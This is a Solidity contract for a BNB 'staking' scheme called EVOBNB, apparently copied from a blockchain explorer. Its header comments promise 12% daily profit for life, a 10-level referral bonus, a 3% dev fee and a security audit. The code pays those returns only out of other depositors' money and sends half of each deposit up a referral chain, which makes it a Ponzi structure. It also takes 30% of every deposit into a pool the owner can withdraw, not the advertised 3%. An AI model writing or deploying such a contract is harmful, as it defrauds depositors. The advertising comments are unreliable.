/**
 *Submitted for verification at BscScan.com on 2021-09-27
*/

/**                                                                   

Developer Product By : EVOSWAP TEAM
AUDITED SMARTCONTRACT BY : HAZE SECURITY 

// Min Stake 0.0001 BNB  ~ [ UNLIMITED DEPOSIT ]
// +12% PROFIT YOUR BNB EVERY DAY [ UNLIMITED - PERIOD LIFETIME ]
// EARNINGS BNB, withdraw any time [ NO MAX WITHDRAW LIMIT ]
// 50% for 10 levels, Example your all 10 level referrals invested 500 BNB, you will receive 250 BNB referral bonuses directly to your wallet.


// Min Stake 0.0001 BNB  ~ [ UNLIMITED DEPOSIT ]
// +12% PROFIT YOUR BNB EVERY DAY [ UNLIMITED - PERIOD LIFETIME ]
// EARNINGS BNB, withdraw any time [ NO MAX WITHDRAW LIMIT ]
// 50% for 10 levels, Example your all 10 level referrals invested 500 BNB, you will receive 250 BNB referral bonuses directly to your wallet.

Rule FEE's
STAKE FEE : Dev & Auto Advertise : 3%
PERSONAL INSURANCE : 2%

*/

pragma solidity ^0.4.25;

contract EVOBNB {

    using SafeMath for uint256;

    uint256 constant public interestRateDivisor = 1000000000000;
    uint256 constant public devCommission = 30;
    uint256 constant public commissionDivisor = 100;

    uint256 constant public secRate = 1388889;

    uint256 public minDepositSize = 0.0001 ether;
    uint256 public releaseTime;
    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 public totalInvested;

    uint256 public devPool;

    address owner;
    address insurance;

    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 payoutSum;
        address affFrom;
    }

    mapping(address => Player) public players;
    mapping(address => uint256[10]) public affSums;

    uint256 [] affRate;

    event NewDeposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(uint256 _releaseTime, address _insurance) public {
      owner = msg.sender;
      releaseTime = _releaseTime;
      insurance = _insurance;
      //minDepositSize = _minDeposit;

      affRate.push(20);
      affRate.push(10);
      affRate.push(5);
      affRate.push(5);
      affRate.push(5);
      affRate.push(1);
      affRate.push(1);
      affRate.push(1);
      affRate.push(1);
      affRate.push(1);
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      for(uint256 i = 0; i < affRate.length; i++){
        affSums[_affAddr][i] = affSums[_affAddr][i].add(1);
        _affAddr = players[_affAddr].affFrom;
      }

    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "StakeBSC not launched yet");
        collect(msg.sender);
        require(msg.value >= minDepositSize);


        uint256 depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint256 devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        devPool = devPool.add(devEarn);

        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

     //function reinvest() public { collect(msg.sender); Player storage player = players[msg.sender];
     // uint256 depositAmount = player.interestProfit; require(contractBalance() >= depositAmount);
	 //player.interestProfit = 0; player.trxDeposit = player.trxDeposit.add(depositAmount); }


    function collect(address _addr) private {
        Player storage player = players[_addr];

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint256 collectProfit = (player.trxDeposit.mul(secPassed.mul(secRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint256 _amount) private {
        if (_amount > 0 && _receiver != address(0)) {
            if (contractBalance() > 0) {
                uint256 payout = _amount > contractBalance() ? contractBalance() : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                emit Withdraw(msg.sender, payout);

                uint256 insuranceFee = payout.mul(2).div(100); // 2%
                payout = payout.sub(insuranceFee);
                msg.sender.transfer(payout);
                insurance.transfer(insuranceFee);
            }
        }
    }

    function distributeRef(uint256 _bnb, address _affFrom) private{

        uint256 _allaff = (_bnb.mul(50)).div(100);
        address affAddr = _affFrom;
        for(uint i = 0; i < affRate.length; i++){
          uint256 _affRewards = (_bnb.mul(affRate[i])).div(100);
          _allaff = _allaff.sub(_affRewards);
          players[affAddr].affRewards = _affRewards.add(players[affAddr].affRewards);
          affAddr.transfer(_affRewards);
          affAddr = players[affAddr].affFrom;
        }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint256) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint256 secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint256 collectProfit = (player.trxDeposit.mul(secPassed.mul(secRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }

    function getAffSums(address _addr) public view returns ( uint256[] memory data, uint256 totalAff) {
      uint256[] memory _affSums = new uint256[](10);
      uint256 total;
      for(uint8 i = 0; i < 10; i++) {
          _affSums[i] = affSums[_addr][i];
          total = total.add(_affSums[i]);
      }
      return (_affSums, total);
    }

    function contractBalance() public view returns(uint256){
        uint256 balance = address(this).balance;
        balance = balance.sub(devPool);

        return balance;
    }

    function claimDevIncome(address _addr, uint256 _amount) public returns(address to, uint256 value){
      require(msg.sender == owner, "unauthorized call");
      require(_amount <= devPool, "invliad amount");

      if(address(this).balance < _amount){
        _amount = address(this).balance;
      }

      devPool = devPool.sub(_amount);

      _addr.transfer(_amount);

      return(_addr, _amount);
    }

    function updateStarttime(uint256 _releaseTime) public returns(bool){
      require(msg.sender == owner, "unauthorized call");
      releaseTime = _releaseTime;
      return true;
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "invliad mul");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "invliad div");
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "invliad sub");
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "invliad +");

        return c;
    }

}